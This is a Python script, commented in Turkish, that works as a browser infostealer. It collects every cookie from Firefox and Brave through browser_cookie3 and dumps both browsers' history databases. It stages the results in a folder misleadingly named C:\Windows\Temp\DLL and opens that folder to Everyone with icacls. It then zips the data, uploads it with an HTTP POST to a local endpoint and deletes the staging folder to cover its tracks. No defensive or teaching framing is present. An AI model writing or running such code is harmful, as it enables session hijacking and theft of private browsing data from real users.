import os
import json
import browser_cookie3
import sqlite3
import shutil
import glob
import requests
import zipfile

# C:\Windows\Temp\DLL dizinini tanımla
temp_dir = r"C:\Windows\Temp\DLL"

# Eğer klasör varsa, sil
try:
    if os.path.exists(temp_dir):
        shutil.rmtree(temp_dir)
        print(f"{temp_dir} klasörü başarıyla silindi.")
except Exception as e:
    print(f"Klasör silinirken hata: {e}")

# Yeni dizini oluştur
try:
    os.makedirs(temp_dir, exist_ok=True)
    print(f"{temp_dir} klasörü başarıyla oluşturuldu.")
except Exception as e:
    print(f"Klasör oluşturulurken hata: {e}")

# Klasör izinlerini ayarla
def set_permissions(directory):
    try:
        os.system(f'icacls "{directory}" /grant Everyone:(OI)(CI)F /T')
        print(f"{directory} klasörüne izinler başarıyla ayarlandı.")
    except Exception as e:
        print(f"Klasör izinleri ayarlanırken hata: {e}")

set_permissions(temp_dir)

# Firefox profil dizinini bul
def get_firefox_profile_path():
    profiles_dir = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
    profiles = glob.glob(os.path.join(profiles_dir, '*default-release'))
    if profiles:
        print(f"Bulunan Firefox profili: {profiles[0]}")
        return profiles[0]
    else:
        print("Firefox profili bulunamadı.")
        return None

firefox_profile = get_firefox_profile_path()

# Tarayıcıların çerezlerini al
browsers = {
    "Firefox": {
        "cookies": browser_cookie3.firefox,
        "history_db": os.path.join(firefox_profile, 'places.sqlite') if firefox_profile else None
    },
    "Brave": {
        "cookies": browser_cookie3.brave,
        "history_db": r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\History"
    }
}

for browser_name, browser_info in browsers.items():
    try:
        # Her tarayıcı için uygun dizini oluştur
        browser_dir = os.path.join(temp_dir, browser_name)
        os.makedirs(browser_dir, exist_ok=True)
        print(f"{browser_name} için dizin oluşturuldu: {browser_dir}")

        # Klasör izinlerini ayarla
        set_permissions(browser_dir)

        # Çerezleri al
        try:
            cookies = browser_info["cookies"]()
            cookie_file_path = os.path.join(browser_dir, 'cookies.json')
            cookie_data = []

            for cookie in cookies:
                cookie_data.append({
                    "name": cookie.name,
                    "value": cookie.value,
                    "domain": cookie.domain,
                    "path": cookie.path,
                    "expires": cookie.expires,
                    "is_secure": cookie.secure
                })

            with open(cookie_file_path, 'w') as cookie_file:
                json.dump(cookie_data, cookie_file, indent=4)
            print(f"{browser_name} çerezleri {cookie_file_path} dosyasına kaydedildi.")

        except Exception as e:
            print(f"{browser_name} çerezleri alınırken hata: {e}")

        # Tarayıcı geçmişini al
        try:
            history_file_path = os.path.expandvars(browser_info["history_db"])
            print(f"{browser_name} geçmişi için veritabanı yolu: {history_file_path}")

            conn = sqlite3.connect(history_file_path)
            cursor = conn.cursor()

            if browser_name == "Firefox":
                cursor.execute("SELECT url, title, last_visit_date FROM moz_places")
            elif browser_name == "Brave":
                cursor.execute("SELECT url, title, last_visit_time FROM urls")

            history_data = [{"url": row[0], "title": row[1], "last_visit_time": row[2]} for row in cursor.fetchall()]
            conn.close()

            # Geçmişi JSON formatında kaydet
            history_file_path = os.path.join(browser_dir, 'history.json')
            with open(history_file_path, 'w') as history_file:
                json.dump(history_data, history_file, indent=4)
            print(f"{browser_name} geçmişi {history_file_path} dosyasına kaydedildi.")

        except sqlite3.OperationalError as e:
            print(f"{browser_name} geçmişi alınırken veritabanı açılamadı: {e}. Tarayıcı kapalı mı?")
        except Exception as e:
            print(f"{browser_name} geçmişi alınırken hata: {e}")

    except Exception as e:
        print(f"{browser_name} için işlem yapılırken hata: {e}")

# DLL klasörünü ZIP dosyasına sıkıştır
zip_file_path = r"C:\Windows\Temp\DLL.zip"
with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zip_file:
    for foldername, subfolders, filenames in os.walk(temp_dir):
        for filename in filenames:
            file_path = os.path.join(foldername, filename)
            zip_file.write(file_path, os.path.relpath(file_path, temp_dir))
print(f"DLL klasörü {zip_file_path} dosyasına sıkıştırıldı.")

# ZIP dosyasını gönder
try:
    with open(zip_file_path, 'rb') as zip_file:
        response = requests.post("http://localhost:5000/upload", files={"DLL.zip": zip_file})
        print(f"ZIP dosyası gönderildi, sunucudan yanıt: {response.text}")
        
    # Başarılı gönderim sonrası temp klasörünü sil
    shutil.rmtree(temp_dir, ignore_errors=True)
    print(f"{temp_dir} klasörü başarıyla silindi.")
except Exception as e:
    print(f"ZIP dosyası gönderilirken hata: {e}")
